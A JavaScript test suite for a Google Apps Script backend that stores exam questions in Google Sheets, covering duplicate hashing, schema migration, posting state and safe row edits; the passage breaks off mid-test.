// ============================================================================
// Tests for the Google Apps Script backend (test/apps-script.test.js)
// ============================================================================
// google_apps_script.js runs inside Google's runtime, so it cannot simply be
// required. Here it is evaluated in a vm sandbox with minimal stubs for the
// Google globals it touches (Utilities, PropertiesService, SpreadsheetApp),
// which lets the pure logic be tested directly: header resolution and the v2
// and v4 aliases the migration depends on, the duplicate hash, the runway
// arithmetic behind the Analytics dashboard, and the token comparison.
//
// The sheet-mutating functions are covered by the fake spreadsheet below, which
// implements just enough of the Range/Sheet API for appendQuestionsToSheet and
// listQuestions to run end to end.
// ============================================================================

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const vm = require('node:vm');
const path = require('node:path');
const crypto = require('node:crypto');

// ---------------------------------------------------------------------------
// Minimal Google Apps Script runtime
// ---------------------------------------------------------------------------

/** What the stubbed LockService was asked to do, newest last. */
let lockLog = [];
/** Queue of tryLock outcomes; anything not queued grants the lock. */
let lockGrants = [];

/** Script properties the stubbed PropertiesService serves. */
const scriptProperties = {};

/**
 * What Sheets keeps for a written value: a leading apostrophe means "store this
 * as text" and is not part of the value read back.
 */
function asStored(value) {
  return typeof value === 'string' && value.startsWith("'") ? value.slice(1) : value;
}

/** A tiny stand-in for a Google Sheet backed by a 2-D array. */
class FakeSheet {
  constructor(name, values = []) {
    this.name = name;
    this.values = values;          // Row-major, including the header row.
    this.validations = [];
    this.formatRules = [];
    this.notes = {};
  }

  getName() { return this.name; }
  getLastRow() { return this.values.length; }
  getLastColumn() { return this.values.reduce((max, row) => Math.max(max, row.length), 0); }
  getMaxRows() { return Math.max(this.values.length, 1000); }

  /** Returns a range object over the requested block, padding short rows. */
  getRange(row, col, numRows = 1, numCols = 1) {
    const sheet = this;
    return {
      getValues() {
        const out = [];
        for (let r = 0; r < numRows; r++) {
          const source = sheet.values[row - 1 + r] || [];
          const line = [];
          for (let c = 0; c < numCols; c++) line.push(source[col - 1 + c] ?? '');
          out.push(line);
        }
        return out;
      },
      getValue() { return (sheet.values[row - 1] || [])[col - 1] ?? ''; },
      setValue(value) {
        while (sheet.values.length < row) sheet.values.push([]);
        const target = sheet.values[row - 1];
        while (target.length < col) target.push('');
        target[col - 1] = asStored(value);
        return this;
      },
      setValues(block) {
        block.forEach((line, r) => {
          while (sheet.values.length < row + r) sheet.values.push([]);
          sheet.values[row - 1 + r] = line.map(asStored);
        });
        return this;
      },
      setNote(note) { sheet.notes[`${row},${col}`] = note; return this; },
      setDataValidation(v) { sheet.validations.push(v); return this; },
      // Formatting calls are chainable no-ops in these tests.
      setFontWeight() { return this; }, setFontColor() { return this; },
      setBackground() { return this; }, setVerticalAlignment() { return this; },
      setHorizontalAlignment() { return this; }, setWrap() { return this; }
    };
  }

  clear() { this.values = []; return this; }
  // Missing until now, which is why nothing exercised upsertSubscriber or
  // logPayment — and why a payment could be counted twice unnoticed.
  appendRow(row) { this.values.push(row.map(asStored)); return this; }
  deleteRow(row) { this.values.splice(row - 1, 1); return this; }
  setFrozenRows() { return this; }
  setFrozenColumns() { return this; }
  setRowHeight() { return this; }
  setColumnWidth() { return this; }
  setConditionalFormatRules(rules) { this.formatRules = rules; return this; }
}

/** A stand-in spreadsheet holding several FakeSheets. */
class FakeSpreadsheet {
  constructor(sheets = [], name = 'Sadhana APPSC Questions Tracker') {
    this.sheets = sheets;
    this.name = name;
  }
  getName() { return this.name; }
  getSheets() { return this.sheets; }
  getSheetByName(name) { return this.sheets.find((s) => s.name === name) || null; }
  insertSheet(name) { const s = new FakeSheet(name); this.sheets.push(s); return s; }
  toast() {}
}

/** Loads google_apps_script.js into a sandbox bound to `spreadsheet`. */
function loadScript(spreadsheet) {
  const sandbox = {
    console,
    Logger: { log() {} },

    SpreadsheetApp: {
      // `null` here simulates a standalone script created at script.google.com
      // rather than from Extensions > Apps Script inside the Sheet.
      getActiveSpreadsheet: () => spreadsheet,
      openById: (id) => (id === 'known-sheet-id' ? new FakeSpreadsheet([], 'Opened By Id') : null),
      // Records what was built. It used to discard every argument and hand back
      // `{kind:'validation'}`, so no test could see that the Posted column was
      // being given a YES/NO-only rule that rejects the SENDING marker the
      // poster writes — the same kind of blind spot as the missing appendRow.
      newDataValidation: () => {
        const built = { kind: 'validation', values: null, allowInvalid: null };
        const self = {
          requireValueInList: (values) => { built.values = values.slice(); return self; },
          setAllowInvalid: (flag) => { built.allowInvalid = flag; return self; },
          build: () => built
        };
        return self;
      },
      newConditionalFormatRule: () => {
        const self = {
          whenTextEqualTo: () => self,
          setBackground: () => self,
          setFontColor: () => self,
          setRanges: () => self,
          build: () => ({ kind: 'rule' })
        };
        return self;
      }
    },

    PropertiesService: {
      getScriptProperties: () => ({ getProperty: (k) => scriptProperties[k] ?? null })
    },

    // Apps Script serialises concurrent executions with this; the stub records
    // the calls so a test can prove the payment path takes and releases it.
    LockService: {
      getScriptLock: () => ({
        tryLock: (ms) => { lockLog.push('lock:' + ms); return lockGrants.shift() !== false; },
        releaseLock: () => { lockLog.push('release'); }
      })
    },

    Utilities: {
      DigestAlgorithm: { SHA_256: 'SHA_256' },
      computeDigest: (_alg, input) => Array.from(crypto.createHash('sha256').update(input).digest()),
      formatDate: (date, _tz, format) => {
        const pad = (n) => String(n).padStart(2, '0');
        if (format === 'yyyyMMdd') return `${date.getFullYear()}${pad(date.getMonth() + 1)}${pad(date.getDate())}`;
        // The real IST wall clock, as Apps Script renders 'dd-MM-yyyy, hh:mm:ss a'.
        // A fixed "10:30 AM" made every claim written after 10:45 IST look older
        // than 15 minutes, so the stale-claim test passed or failed by time of day.
        const ist = new Date(date.getTime() + 5.5 * 3600 * 1000);
        const h24 = ist.getUTCHours();
        const h12 = h24 % 12 === 0 ? 12 : h24 % 12;
        return `${pad(ist.getUTCDate())}-${pad(ist.getUTCMonth() + 1)}-${ist.getUTCFullYear()}, ` +
          `${pad(h12)}:${pad(ist.getUTCMinutes())}:${pad(ist.getUTCSeconds())} ${h24 < 12 ? 'AM' : 'PM'}`;
      }
    },

    ContentService: {
      MimeType: { JSON: 'application/json' },
      createTextOutput: (text) => ({ text, setMimeType() { return this; } })
    }
  };

  vm.createContext(sandbox);
  const source = fs.readFileSync(path.join(__dirname, '..', 'google_apps_script.js'), 'utf8');
  vm.runInContext(source, sandbox);
  return sandbox;
}

/** Builds a fresh script sandbox over an empty spreadsheet. */
function freshScript(sheets = []) {
  lockLog = [];
  lockGrants = [];
  return loadScript(new FakeSpreadsheet(sheets));
}

// ===========================================================================
// Pure helpers
// ===========================================================================

test('cronRunsPerDay understands the cron forms used in the Config tab', () => {
  const s = freshScript();
  assert.equal(s.cronRunsPerDay('0 9,18 * * *'), 2, 'two fixed hours');
  assert.equal(s.cronRunsPerDay('0 8,14,20 * * *'), 3, 'three fixed hours');
  assert.equal(s.cronRunsPerDay('0 */3 * * *'), 8, 'every three hours');
  assert.equal(s.cronRunsPerDay('0 */2 * * *'), 12, 'every two hours');
  assert.equal(s.cronRunsPerDay('0 * * * *'), 24, 'hourly');
  assert.equal(s.cronRunsPerDay(''), 0, 'no schedule');
  assert.equal(s.cronRunsPerDay('nonsense'), 0, 'malformed schedule');
});

test('dayKey turns IST timestamps into sortable ISO days', () => {
  const s = freshScript();
  assert.equal(s.dayKey('05-09-2026, 10:30:00 AM IST'), '2026-09-05');
  assert.equal(s.dayKey('31-12-2025, 11:59:00 PM IST'), '2025-12-31');
  assert.equal(s.dayKey('-'), '', 'placeholder produces no day');
  assert.equal(s.dayKey(''), '', 'empty produces no day');
  assert.equal(s.dayKey('not a date'), '', 'unparseable produces no day');

  // The keys must sort chronologically as plain strings, since the timeline
  // chart relies on a lexicographic sort.
  const keys = ['05-09-2026, 1:00:00 AM', '04-09-2026, 1:00:00 AM', '05-08-2026, 1:00:00 AM'].map(s.dayKey);
  assert.deepEqual(keys.slice().sort(), ['2026-08-05', '2026-09-04', '2026-09-05']);
});

test('hashQuestion ignores cosmetic differences but separates real ones', () => {
  const s = freshScript();
  const base = s.hashQuestion('Who was the first President of India?');

  assert.equal(base, s.hashQuestion('who was the first president of india?'), 'case must not matter');
  assert.equal(base, s.hashQuestion('  Who  was the first President of India?  '), 'whitespace must not matter');
  assert.equal(base, s.hashQuestion('Who was the first President of India!'), 'punctuation must not matter');
  assert.notEqual(base, s.hashQuestion('Who was the first Prime Minister of India?'), 'different questions must differ');
  assert.equal(base.length, 16, 'hash is a stable 16 hex characters');
});

test('questions in a non-Latin script get their own hashes, not one shared empty one', () => {
  const s = freshScript();
  const telugu = [
    'మచిలీపట్నంలో ఫ్యాక్టరీని స్థాపించడానికి ఇంగ్లీష్ ఈస్ట్ ఇండియా కంపెనీకి ఎవరు అనుమతి ఇచ్చారు?',
    'బెరార్ రాజ్యాన్ని ఏ రాజవంశం స్థాపించింది?',
    'ఆది మహాదేవ (త్రయంబకేశ్వర్) ఆలయం సమీపంలో ఏ నది ఉద్భవిస్తుంది?',
    'భగవద్గీతను పర్షియన్ భాషలోకి ఎవరు అనువదించారు?'
  ];
  const hashes = telugu.map((q) => s.hashQuestion(q));
  assert.equal(new Set(hashes).size, telugu.length, 'every Telugu question must hash differently');

  // Cosmetic differences still do not matter, in any script.
  assert.equal(hashes[1], s.hashQuestion('  బెరార్ రాజ్యాన్ని ఏ రాజవంశం స్థాపించింది!  '));

  // A question that is only punctuation cannot collapse onto another one.
  assert.notEqual(s.hashQuestion('???'), s.hashQuestion('!!!'));
});

test('a question added under the old Latin-only hash is still recognised', () => {
  const s = freshScript();
  // Plain English text hashes the same as it always did, so old rows match
  // without any fallback at all.
  const english = 'Who was the first President of India?';
  assert.equal(s.hashQuestion(english), s.legacyHashQuestion(english));

  // Text the old hash mangled — a rupee sign, an accent — now hashes
  // differently, so the old fingerprint is checked as well.
  const priced = 'What was the price of the scheme in 2020, in rupees (₹500 crore)?';
  const legacy = s.legacyHashQuestion(priced);
  assert.notEqual(legacy, s.hashQuestion(priced));
  const existing = {};
  existing[legacy] = true;
  assert.ok(s.isKnownQuestion(priced, existing), 'a row hashed before the fix is still a duplicate');

  // The old hash of a Telugu question is the degenerate one every Telugu
  // question shared, so it must never be matched on.
  assert.equal(s.legacyHashQuestion('బెరార్ రాజ్యాన్ని ఏ రాజవంశం స్థాపించింది?'), '');
  const degenerate = {};
  degenerate[s.hashQuestion('')] = true;
  assert.ok(!s.isKnownQuestion('ఆది మహాదేవ ఆలయం సమీపంలో ఏ నది ఉద్భవిస్తుంది?', degenerate));
});

test('normaliseChoice coerces to the allowed set with a fallback', () => {
  const s = freshScript();
  assert.equal(s.normaliseChoice('approved', s.STATUS_VALUES, 'Draft'), 'Approved');
  assert.equal(s.normaliseChoice('  HARD ', s.DIFFICULTY_VALUES, 'Medium'), 'Hard');
  assert.equal(s.normaliseChoice('nonsense', s.STATUS_VALUES, 'Draft'), 'Draft');
  assert.equal(s.normaliseChoice('', s.DIFFICULTY_VALUES, 'Medium'), 'Medium');
  assert.equal(s.normaliseChoice(null, s.STATUS_VALUES, 'Draft'), 'Draft');
});

test('clampInt keeps pagination parameters inside safe bounds', () => {
  const s = freshScript();
  assert.equal(s.clampInt('5', 1, 1, 100), 5);
  assert.equal(s.clampInt('99999', 1, 1, 100), 100, 'clamps above the maximum');
  assert.equal(s.clampInt('-4', 1, 1, 100), 1, 'clamps below the minimum');
  assert.equal(s.clampInt('abc', 7, 1, 100), 7, 'falls back when unparseable');
  assert.equal(s.clampInt(undefined, 7, 1, 100), 7);
});

test('subjectCode produces a stable prefix for Question IDs', () => {
  const s = freshScript();
  assert.equal(s.subjectCode('Polity'), 'POL');
  assert.equal(s.subjectCode('Current Affairs'), 'CUR');
  assert.equal(s.subjectCode('AP Geography'), 'APG');
  assert.equal(s.subjectCode('Some New Subject'), 'SOM', 'derives a code for unlisted subjects');
});

test('constantTimeEquals compares correctly', () => {
  const s = freshScript();
  assert.equal(s.constantTimeEquals('secret', 'secret'), true);
  assert.equal(s.constantTimeEquals('secret', 'secrey'), false);
  assert.equal(s.constantTimeEquals('secret', 'secre'), false, 'length mismatch');
  assert.equal(s.constantTimeEquals('', ''), true);
});

// ===========================================================================
// Header resolution — the basis of a lossless migration
// ===========================================================================

test('headerMap resolves the v5 layout exactly', () => {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const map = s.headerMap(sheet);

  s.QUESTION_HEADERS.forEach((header, index) => {
    assert.equal(map[header], index, `${header} resolved to the wrong column`);
  });
});

test('headerMap resolves a legacy v4 16-column sheet by name, not position', () => {
  const s = freshScript();
  const v4Headers = [
    'S.No', 'Date', 'Newspaper', 'Subject', 'Question', 'Option A', 'Option B',
    'Option C', 'Option D', 'Correct Answer', 'Explanation', 'Posted',
    'Posted At', 'Added At', 'Added By', 'Telegram Msg ID'
  ];
  const map = s.headerMap(new FakeSheet('Polity', [v4Headers]));

  // Date sits at index 1 in v4 but index 2 in v5 — resolving by name is what
  // stops the migration writing dates into the Question ID column.
  assert.equal(map['Date'], 1);
  assert.equal(map['Question'], 4);
  assert.equal(map['Posted'], 11);
  assert.equal(map['Telegram Msg ID'], 15);
});

test('headerMap tolerates alternative spellings', () => {
  const s = freshScript();
  const map = s.headerMap(new FakeSheet('Polity', [[
    'Sl. No', 'QID', 'date', 'Source', 'Subject', 'Sub-Topic', 'Question Text',
    'Opt A', 'Opt B', 'Opt C', 'Opt D', 'Answer', 'Exp', 'Level', 'Keywords'
  ]]));

  assert.equal(map['S.No'], 0);
  assert.equal(map['Question ID'], 1);
  assert.equal(map['Newspaper'], 3, '"Source" is an accepted alias for Newspaper');
  assert.equal(map['Topic'], 5, '"Sub-Topic" is an accepted alias for Topic');
  assert.equal(map['Correct Answer'], 11);
  assert.equal(map['Difficulty'], 13, '"Level" is an accepted alias for Difficulty');
});

// ===========================================================================
// Migration
// ===========================================================================

test('a legacy "YES | timestamp" Posted cell counts as posted', () => {
  // The v2 layout wrote the flag and the time into one cell. Reading that as
  // unposted would re-send every already-published question to Telegram.
  const s = freshScript();
  assert.equal(s.isPostedValue('YES'), true);
  assert.equal(s.isPostedValue('YES | 05/09/2026, 01:16:53 PM'), true);
  assert.equal(s.isPostedValue('yes | 05/09/2026'), true, 'must be case-insensitive');
  assert.equal(s.isPostedValue('  YES  '), true);
  assert.equal(s.isPostedValue('NO'), false);
  assert.equal(s.isPostedValue(''), false);
  assert.equal(s.isPostedValue('YESTERDAY'), false, 'word boundary must be respected');

  assert.equal(s.postedTimestampFrom('YES | 05/09/2026, 01:16:53 PM'), '05/09/2026, 01:16:53 PM');
  assert.equal(s.postedTimestampFrom('YES'), '');
  assert.equal(s.postedTimestampFrom('NO'), '');
});

test('migrating a v2 sheet preserves posted state and recovers the timestamp', () => {
  // Exactly the shape of the user's live sheet before upgrading.
  const s = freshScript();
  const v2Headers = [
    'Date', 'Newspaper', 'Subject', 'Question', 'Option A', 'Option B',
    'Option C', 'Option D', 'Correct Answer', 'Explanation', 'Posted'
  ];
  const sheet = new FakeSheet('Environment', [
    v2Headers,
    ['05-09-2026', 'The Hindu', 'Environment', 'Already sent question?', 'a', 'b', 'c', 'd', 'B',
     'Because.', 'YES | 05/09/2026, 01:16:37 PM'],
    ['05-09-2026', 'The Hindu', 'Environment', 'Still pending question?', 'a', 'b', 'c', 'd', 'C',
     'Because.', 'NO']
  ]);

  const script = loadScript(new FakeSpreadsheet([sheet]));
  assert.equal(script.migrateSheetToCanonical(sheet), 2);

  const map = script.headerMap(sheet);
  const sent = sheet.values[1];
  const pending = sheet.values[2];

  // The already-published row must stay published.
  assert.equal(sent[map['Posted']], 'YES', 'a posted row was reset to NO — it would be re-sent');
  assert.equal(sent[map['Status']], 'Posted');
  assert.equal(sent[map['Times Posted']], 1);
  assert.equal(sent[map['Posted At']], '05/09/2026, 01:16:37 PM', 'the buried timestamp was lost');

  // The pending row stays pending.
  assert.equal(pending[map['Posted']], 'NO');
  assert.equal(pending[map['Status']], 'Draft');
  assert.equal(pending[map['Posted At']], '');

  // And the v2 data landed in the right v5 columns.
  assert.equal(sent[map['Date']], '05-09-2026');
  assert.equal(sent[map['Question']], 'Already sent question?');
  assert.equal(sent[map['Correct Answer']], 'B');
  assert.match(sent[map['Question ID']], /^ENV-\d{8}-0001$/);
  assert.equal(sent[map['Dup Hash']].length, 16);
});

test('a legacy posted row is never offered for posting again', () => {
  const s = freshScript();
  const sheet = new FakeSheet('Environment', [
    ['Date', 'Newspaper', 'Subject', 'Question', 'Option A', 'Option B', 'Option C',
     'Option D', 'Correct Answer', 'Explanation', 'Posted'],
    ['05-09-2026', 'The Hindu', 'Environment', 'Already sent?', 'a', 'b', 'c', 'd', 'A',
     'e', 'YES | 05/09/2026, 01:16:37 PM'],
    ['05-09-2026', 'The Hindu', 'Environment', 'Not sent yet?', 'a', 'b', 'c', 'd', 'A', 'e', '']
  ]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  const pending = script.fetchUnpostedQuestions('Environment', 50, false);
  assert.deepEqual(Array.from(pending, (q) => q.question_text), ['Not sent yet?'],
    'a question already sent to Telegram was queued to go out again');

  // Analytics must count it as posted too, even before migration.
  const analytics = script.buildAnalytics();
  const env = analytics.subjects.find((x) => x.subject === 'Environment');
  assert.equal(env.posted, 1);
  assert.equal(env.pending, 1);
});

test('a header that is absent maps to -1 rather than to a wrong column', () => {
  // Regression test. headerMap used to fall back to the canonical position for
  // a missing header, so reading "Question ID" (canonical index 1) from a v4
  // sheet returned that sheet's Date column. The migration then wrote dates
  // into the Question ID column of every migrated row.
  const s = freshScript();
  const v4Headers = [
    'S.No', 'Date', 'Newspaper', 'Subject', 'Question', 'Option A', 'Option B',
    'Option C', 'Option D', 'Correct Answer', 'Explanation', 'Posted',
    'Posted At', 'Added At', 'Added By', 'Telegram Msg ID'
  ];
  const sheet = new FakeSheet('Polity', [
    v4Headers,
    [1, '05-09-2026', 'The Hindu', 'Polity', 'Q?', 'a', 'b', 'c', 'd', 'A', 'e', 'NO', '-', '-', 'x@y.com', '-']
  ]);
  const map = s.headerMap(sheet);

  // Columns v4 does not have must report as absent.
  ['Question ID', 'Topic', 'Difficulty', 'Tags', 'Source URL', 'Status',
   'Scheduled For', 'Thread ID', 'Poll ID', 'Times Posted', 'Updated At',
   'Updated By', 'Dup Hash', 'Review Notes'].forEach((header) => {
    assert.equal(map[header], -1, `${header} should be reported absent in a v4 sheet`);
  });

  // Reading an absent column yields empty, never a neighbouring value.
  const row = sheet.values[1];
  assert.equal(s.cell(row, map, 'Question ID'), '', 'absent column leaked the Date value');
  assert.equal(s.cell(row, map, 'Topic'), '', 'absent column leaked Option A');
  assert.equal(s.cell(row, map, 'Difficulty'), '', 'absent column leaked Added At');

  // Writes still resolve to the canonical column so migration can fill them in.
  assert.equal(s.colNum(map, 'Question ID'), 2);
  assert.equal(s.colNum(map, 'Dup Hash'), 29);
});


test('migrateSheetToCanonical moves v4 data into the right v5 columns', () => {
  const s = freshScript();
  const v4Headers = [
    'S.No', 'Date', 'Newspaper', 'Subject', 'Question', 'Option A', 'Option B',
    'Option C', 'Option D', 'Correct Answer', 'Explanation', 'Posted',
    'Posted At', 'Added At', 'Added By', 'Telegram Msg ID'
  ];
  const sheet = new FakeSheet('Polity', [
    v4Headers,
    [1, '05-09-2026', 'The Hindu', 'Polity', 'Old question one?', 'A1', 'B1', 'C1', 'D1', 'B',
     'Because one.', 'YES', '06-09-2026, 09:00:00 AM IST', '05-09-2026, 08:00:00 AM IST', 'curator@x.com', '555'],
    [2, '05-09-2026', 'The Hindu', 'Polity', 'Old question two?', 'A2', 'B2', 'C2', 'D2', 'D',
     'Because two.', '', '-', '05-09-2026, 08:00:00 AM IST', 'curator@x.com', '-']
  ]);

  const spreadsheet = new FakeSpreadsheet([sheet]);
  const script = loadScript(spreadsheet);
  const migrated = script.migrateSheetToCanonical(sheet);

  assert.equal(migrated, 2, 'both rows were migrated');
  assert.deepEqual(Array.from(sheet.values[0]), Array.from(script.QUESTION_HEADERS), 'header row is now canonical');

  const map = script.headerMap(sheet);
  const rowOne = sheet.values[1];
  const rowTwo = sheet.values[2];

  // Every v4 value landed in its v5 column.
  assert.equal(rowOne[map['Date']], '05-09-2026');
  assert.equal(rowOne[map['Question']], 'Old question one?');
  assert.equal(rowOne[map['Correct Answer']], 'B');
  assert.equal(rowOne[map['Explanation']], 'Because one.');
  assert.equal(rowOne[map['Added By']], 'curator@x.com');
  assert.equal(rowOne[map['Telegram Msg ID']], '555');

  // Posted rows gain a consistent Status and a Times Posted count.
  assert.equal(rowOne[map['Posted']], 'YES');
  assert.equal(rowOne[map['Status']], 'Posted');
  assert.equal(rowOne[map['Times Posted']], 1);

  // Unposted rows are normalised to NO / Draft, and '-' placeholders cleared.
  assert.equal(rowTwo[map['Posted']], 'NO');
  assert.equal(rowTwo[map['Status']], 'Draft');
  assert.equal(rowTwo[map['Posted At']], '');
  assert.equal(rowTwo[map['Telegram Msg ID']], '');

  // New columns are populated so nothing is left blank that should not be.
  assert.match(rowOne[map['Question ID']], /^POL-\d{8}-0001$/);
  assert.equal(rowOne[map['Difficulty']], 'Medium', 'defaults applied');
  assert.equal(rowOne[map['Dup Hash']].length, 16, 'duplicate fingerprint computed');

  // Re-running the migration must be safe and must not renumber or duplicate.
  const again = script.migrateSheetToCanonical(sheet);
  assert.equal(again, 2, 'migration is idempotent');
  assert.equal(sheet.values.length, 3, 'no rows were added on the second run');
});

// ===========================================================================
// Appending
// ===========================================================================

test('appendQuestionsToSheet assigns ids, timestamps and skips duplicates', () => {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const spreadsheet = new FakeSpreadsheet([sheet]);
  const script = loadScript(spreadsheet);

  const first = script.appendQuestionsToSheet('Polity', [
    { question: 'First question?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'b', explanation: 'e' },
    { question: 'Second question?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'C', difficulty: 'hard' }
  ], 'Curator (curator@x.com)', true);

  assert.equal(first.added, 2);
  assert.equal(first.skipped, 0);
  assert.deepEqual(Array.from(first.ids, (id) => id.slice(-4)), ['0001', '0002']);

  const map = script.headerMap(sheet);
  const row = sheet.values[1];
  assert.equal(row[map['S.No']], 1);
  assert.equal(row[map['Subject']], 'Polity');
  assert.equal(row[map['Correct Answer']], 'B', 'answer is upper-cased');
  assert.equal(row[map['Posted']], 'NO');
  // What this line does: Asserts that newly added questions default to 'Approved' status
  // What it brings: Validates the user requirement that newly added questions are automatically Approved
  // Where changes can be seen: In test suite execution results
  assert.equal(row[map['Status']], 'Approved');
  assert.equal(row[map['Times Posted']], 0);
  assert.equal(row[map['Added By']], 'Curator (curator@x.com)');
  assert.equal(sheet.values[2][map['Difficulty']], 'Hard', 'difficulty is normalised');

  // The same question again is recognised despite different casing and spacing.
  const second = script.appendQuestionsToSheet('Polity', [
    { question: '  FIRST QUESTION!  ', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A' },
    { question: 'Third question?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A' }
  ], 'Curator', true);

  assert.equal(second.skipped, 1, 'the duplicate was skipped');
  assert.equal(second.added, 1, 'the genuinely new question was added');
  assert.equal(sheet.values[3][map['S.No']], 3, 'S.No continues from the last row');

  // With skipDuplicates off the same question is allowed through.
  const third = script.appendQuestionsToSheet('Polity', [
    { question: 'First question?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A' }
  ], 'Curator', false);
  assert.equal(third.added, 1);
});

test('a batch of Telugu questions is added in full, not swallowed as duplicates', () => {
  const s = freshScript();
  const sheet = new FakeSheet('AP Geography', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  const questions = [
    'మచిలీపట్నంలో ఫ్యాక్టరీని స్థాపించడానికి ఇంగ్లీష్ ఈస్ట్ ఇండియా కంపెనీకి ఎవరు అనుమతి ఇచ్చారు?',
    'బెరార్ రాజ్యాన్ని ఏ రాజవంశం స్థాపించింది?',
    'ఆది మహాదేవ (త్రయంబకేశ్వర్) ఆలయం సమీపంలో ఏ నది ఉద్భవిస్తుంది?',
    'భగవద్గీతను పర్షియన్ భాషలోకి ఎవరు అనువదించారు?',
    "ప్రాకృత భాషలో సంకలనం చేయబడిన 'గాథ సప్తసతి' గ్రంథం దేనిని వివరిస్తుంది?",
    'భారతదేశంపై దండెత్తిన మొదటి ముస్లిం పాలకుడు ఎవరు?',
    'కింది జతలలో ఏది తప్పు?',
    'కింది నిర్మాణాలలో ఏది ముహమ్మద్ కులీ కుతుబ్ షాచే నిర్మించబడలేదు?',
    "ఏ సంఘటన జ్ఞాపకార్థం 'చార్మినార్' నిర్మించబడింది?",
    'ఔరంగజేబు గోల్కొండను ఏ సంవత్సరంలో జయించాడు?'
  ].map((question) => ({
    question, option_a: 'ఎ', option_b: 'బి', option_c: 'సి', option_d: 'డి', correct_answer: 'B',
    explanation: 'వివరణ', topic: 'Qutubshahi'
  }));

  const result = script.appendQuestionsToSheet('AP Geography', questions, 'Curator', true);
  assert.equal(result.added, 10, 'all ten Telugu questions should be added');
  assert.equal(result.skipped, 0);

  // Uploading the same file again is still recognised as a repeat.
  const again = script.appendQuestionsToSheet('AP Geography', questions, 'Curator', true);
  assert.equal(again.added, 0);
  assert.equal(again.skipped, 10);
});

test('a Telugu question already stored under the broken hash is repaired, not added twice', () => {
  const s = freshScript();
  const question = 'బెరార్ రాజ్యాన్ని ఏ రాజవంశం స్థాపించింది?';
  const sheet = new FakeSheet('AP Geography', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));
  const map = script.headerMap(sheet);

  // A row as the old hash left it: the same fingerprint every Telugu question got.
  const row = new Array(s.QUESTION_HEADERS.length).fill('');
  row[map['S.No']] = 1;
  row[map['Question']] = question;
  row[map['Dup Hash']] = script.degenerateHash();
  sheet.values.push(row);

  const result = script.appendQuestionsToSheet('AP Geography', [
    { question, option_a: 'ఎ', option_b: 'బి', option_c: 'సి', option_d: 'డి', correct_answer: 'A' }
  ], 'Curator', true);

  assert.equal(result.added, 0, 'the question is already in the sheet');
  assert.equal(result.skipped, 1);
  assert.equal(sheet.values[1][map['Dup Hash']], script.hashQuestion(question), 'the stored row was repaired');
});

test('updateQuestionRow only writes allowlisted fields', () => {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const spreadsheet = new FakeSpreadsheet([sheet]);
  const script = loadScript(spreadsheet);

  const { ids } = script.appendQuestionsToSheet('Polity', [
    { question: 'Editable question?', option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd', correct_answer: 'A' }
  ], 'Curator', true);

  const map = script.headerMap(sheet);
  const before = sheet.values[1].slice();

  const ok = script.updateQuestionRow('Polity', ids[0], {
    topic: 'Preamble',
    status: 'approved',
    correct_answer: 'z',        // Invalid — must be coerced to A.
    posted: 'YES',              // Not on the allowlist — must be ignored.
    added_by: 'attacker@evil',  // Not on the allowlist — must be ignored.
    question_id: 'FORGED'       // Not on the allowlist — must be ignored.
  }, 'Editor (editor@x.com)');

  assert.equal(ok, true);
  assert.equal(sheet.values[1][map['Topic']], 'Preamble');
  assert.equal(sheet.values[1][map['Status']], 'Approved', 'status normalised to the canonical spelling');
  assert.equal(sheet.values[1][map['Correct Answer']], 'A', 'an invalid answer falls back to A');
  assert.equal(sheet.values[1][map['Updated By']], 'Editor (editor@x.com)');

  // The protected columns are untouched.
  assert.equal(sheet.values[1][map['Posted']], before[map['Posted']], 'Posted was writable from the patch');
  assert.equal(sheet.values[1][map['Added By']], before[map['Added By']], 'Added By was writable from the patch');
  assert.equal(sheet.values[1][map['Question ID']], ids[0], 'Question ID was writable from the patch');
});

test('a row with no Question ID can still be edited and deleted', () => {
  // The reported bug: deleting from the dashboard reported success but the row
  // stayed in the sheet, because rows written before the migration have an
  // empty Question ID and lookup was by id only.
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [
    s.QUESTION_HEADERS.slice(),
    ['', '', '05-09-2026', 'The Hindu', 'Polity', '', 'Legacy question with no id?',
     'a', 'b', 'c', 'd', 'A', 'why', '', '', '', '', 'NO', '', '', '', '', '', 0, '', '', '', '', '', '']
  ]);
  const script = loadScript(new FakeSpreadsheet([sheet]));
  const map = script.headerMap(sheet);

  // Addressing by id alone finds nothing, as before.
  assert.equal(script.findRowByQuestionId(sheet, map, ''), -1);

  // The row-number fallback resolves it when the text matches.
  assert.equal(script.locateRow(sheet, map, '', 2, 'Legacy question with no id?'), 2);

  // An edit succeeds and backfills an id so later edits address it directly.
  assert.equal(script.updateQuestionRow('Polity', '', { topic: 'Judiciary' }, 'Editor', 2,
    'Legacy question with no id?'), true);
  assert.equal(sheet.values[1][map['Topic']], 'Judiciary');
  assert.match(sheet.values[1][map['Question ID']], /^POL-\d{8}-\d{4}$/, 'id was not backfilled');

  // And the delete actually removes the row.
  assert.equal(script.deleteQuestionRow('Polity', '', 2, 'Legacy question with no id?'), true);
  assert.equal(sheet.getLastRow(), 1, 'the row was reported deleted but is still there');
});

test('the row-number fallback refuses to act on the wrong row', () => {
  // If another row was inserted or removed since the dashboard read the page,
  // the row number now points at a different question. Acting on it would
  // destroy the wrong record, so a text mismatch must abort.
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [
    s.QUESTION_HEADERS.slice(),
    ['', '', '', '', 'Polity', '', 'A completely different question?',
     'a', 'b', 'c', 'd', 'A', '', '', '', '', '', 'NO', '', '', '', '', '', 0, '', '', '', '', '', '']
  ]);
  const script = loadScript(new FakeSpreadsheet([sheet]));
  const map = script.headerMap(sheet);

